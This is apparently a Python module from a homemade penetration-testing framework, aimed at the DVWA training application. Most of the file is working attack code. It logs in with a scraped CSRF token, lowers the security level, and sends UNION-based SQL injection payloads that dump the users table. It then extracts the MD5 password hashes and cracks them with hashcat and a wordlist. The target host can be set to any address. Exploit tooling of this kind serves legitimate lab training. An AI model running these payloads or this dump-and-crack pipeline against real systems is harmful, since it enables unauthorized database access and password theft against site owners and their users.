from base_module import BaseModule
from utils import colored
import requests
import subprocess
import os
import re
from bs4 import BeautifulSoup
import socket

class DVWASQLI(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dvwa_sqli"
        self.description = "DVWA SQL Injection + Hash Cracking (Part 5)"

        self.options = {
            "RHOST": {"value": "192.168.107.129", "required": True, "description": "Target DVWA IP or URL"},
            "RPORT": {"value": "80", "required": True, "description": "Target DVWA port"},
            "USERNAME": {"value": "admin", "required": True, "description": "DVWA username"},
            "PASSWORD": {"value": "password", "required": True, "description": "DVWA password"},
            "WORDLIST": {"value": "/usr/share/wordlists/rockyou.txt", "required": False, "description": "Path to wordlist for hashcat"},
        }

        self.session = None
        self.logged_in = False
        self.hashes_file = "dvwa_hashes.txt"

    def show_options(self):
        print(colored(f"\nModule options ({self.name}):", "orange"))

        header = f"{'Name':<15} {'Current Setting':<30} {'Required':<10} {'Description'}"
        print(colored(header, "yellow"))
        print("-" * 80)

        for name, data in self.options.items():
            value = data.get("value", "")
            required = "yes" if data.get("required") else "no"
            desc = data.get("description", "")
            print(f"{name:<15} {colored(value, 'green'):<30} {colored(required, 'red'):<10} {desc}")

    def show_help(self):
        print(colored("\n=== DVWA SQL Injection Module (Part 5) ===", "orange"))
        print("Dumps users table via SQLi and cracks hashes with hashcat")
        print("Commands:")
        print("  run                  - Login + dump users + crack hashes")
        print("  set <option> <value> - Set RHOST, USERNAME, PASSWORD, etc.")
        print("  show options         - Show current settings")
        print("  help                 - Show this help")
        print("  back / exit          - Return to framework\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1].upper()
            value = parts[2]

            if option in self.options:
                self.options[option]["value"] = value
                print(colored(f"{option} â†’ {value}", "green"))
            else:
                print(colored(f"Unknown option: {option}", "red"))
            return

        if low in ["run", "exploit"]:
            self.run()
            return

        if low in ["back", "exit", "quit"]:
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def run(self):
        rhost = self.options["RHOST"]["value"]
        print(colored(f"[*] Starting SQL Injection on {rhost}", "yellow"))

        self.session = requests.Session()

        # Step 1: Login (self-contained)
        login_url = f"http://{rhost}/login.php"
        print(colored(f"  Fetching login page...", "yellow"))

        try:
            r_get = self.session.get(login_url, timeout=5)
            print(colored(f"    Status: {r_get.status_code}", "green"))
        except Exception as e:
            print(colored(f"  [-] Failed to fetch login page: {e}", "red"))
            return

        # CSRF token
        token_match = re.search(r'name=[\'"]user_token[\'"]\s+value=[\'"]([a-f0-9]+)[\'"]', r_get.text, re.IGNORECASE)
        user_token = ""
        if token_match:
            user_token = token_match.group(1)
            print(colored(f"  [+] CSRF token obtained: {user_token}", "green"))
        else:
            print(colored("  [-] CSRF token not found", "red"))
            print("  Response snippet (first 500 chars):")
            print(r_get.text[:500])
            return

        login_data = {
            "username": self.options["USERNAME"]["value"],
            "password": self.options["PASSWORD"]["value"],
            "user_token": user_token,
            "Login": "Login"
        }

        print(colored("  Attempting login...", "yellow"))
        r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

        if "Logout" in r_login.text or r_login.status_code in (301, 302):
            print(colored("[+] Login successful", "green"))
        else:
            print(colored("[-] Login failed", "red"))
            print("  Status code:", r_login.status_code)
            print("  Response snippet (first 500 chars):")
            print(r_login.text[:500])
            return

        # Set security to Low
        sec_url = f"http://{rhost}/security.php"
        print(colored("  Setting security level to Low...", "yellow"))
        self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})

        self.logged_in = True
        print(colored("[+] Ready for SQLi", "green"))

        # Step 2: SQL Injection dump
        vuln_url = f"http://{rhost}/vulnerabilities/sqli/"
        payloads = [
            "1' UNION SELECT user, password FROM users-- ",
            "1' UNION SELECT NULL, CONCAT(user, ':', password) FROM users-- ",
            "1' OR '1'='1-- "
        ]

        found_hashes = set()

        for payload in payloads:
            print(colored(f"  Trying payload: {payload}", "yellow"))
            data = {"id": payload, "Submit": "Submit"}

            try:
                r = self.session.post(vuln_url, data=data, timeout=5)
                print(colored(f"    Status: {r.status_code} | Length: {len(r.text)} chars", "green"))

                soup = BeautifulSoup(r.text, "html.parser")
                text = soup.get_text(separator="\n", strip=True)

                print(colored("    Cleaned text preview (first 300 chars):", "yellow"))
                print(text[:300])

                hashes = re.findall(r'[a-f0-9]{32}', text, re.IGNORECASE)
                for h in hashes:
                    h = h.lower()
                    if h not in found_hashes:
                        found_hashes.add(h)
                        print(colored(f"    [+] Found hash: {h}", "green"))

            except Exception as e:
                print(colored(f"    [-] Request or parsing failed: {e}", "red"))
                continue

        if not found_hashes:
            print(colored("[-] No valid MD5 hashes found.", "red"))
            print("  Tip: Check if DVWA is on Low security and run /setup.php.")
            return

        print(colored(f"[+] Found {len(found_hashes)} hashes", "green"))

        with open(self.hashes_file, "w") as f:
            for h in found_hashes:
                f.write(h + "\n")

        print(colored(f"[+] Hashes saved to {self.hashes_file}", "green"))

        # Crack
        wordlist = self.options["WORDLIST"]["value"]
        if os.path.exists(wordlist):
            print(colored(f"[*] Starting hashcat...", "yellow"))
            try:
                subprocess.run([
                    "hashcat", "-m", "0", "-a", "0", "-O", "--force",
                    self.hashes_file, wordlist
                ], check=False)
                print(colored("\nCracked passwords (if any):", "green"))
                cracked = subprocess.run(["hashcat", "-m", "0", self.hashes_file, "--show"], capture_output=True, text=True)
                print(cracked.stdout)
            except Exception as e:
                print(colored(f"[-] Hashcat failed: {e}", "red"))
        else:
            print(colored(f"[-] Wordlist not found: {wordlist}", "red"))